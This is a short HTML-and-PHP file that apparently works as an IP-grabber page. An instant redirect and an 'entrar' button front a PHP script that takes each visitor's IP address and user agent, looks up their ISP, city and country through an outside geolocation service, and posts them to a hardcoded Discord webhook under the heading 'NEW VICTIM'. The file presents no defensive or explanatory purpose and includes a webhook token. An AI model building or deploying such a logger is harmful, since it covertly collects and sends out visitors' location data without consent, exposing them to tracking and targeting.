<html>
    <head>
        <meta http-equiv='refresh' content='0; URL=REDIRECT LINK HERE'>
    </head>
    <body>
      <button onclick="window.location.href = './index.html'">entrar</button>

    </body>
</html>
<?php
$webhookurl = "https://discord.com/api/webhooks/945051058995089449/qKsnIQVV8X_q4iGltEcorrGBSLGFUl1cIDKMjdT4WlFl6-HldVFD_a78pBVXzoAlaNXc";
$ip= $_SERVER['REMOTE_ADDR'];
$useragent= $_SERVER['HTTP_USER_AGENT'];
$json=file_get_contents("https://extreme-ip-lookup.com/json/$ip");
extract(json_decode($json,true));
$msg = "**NEW VICTIM**
```IP: $ip
ISP: $isp
City: $city
Country: $country
UserAgent: $useragent```";
$json_data = array ('content'=>"$msg");
$make_json = json_encode($json_data);
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $ch );
?>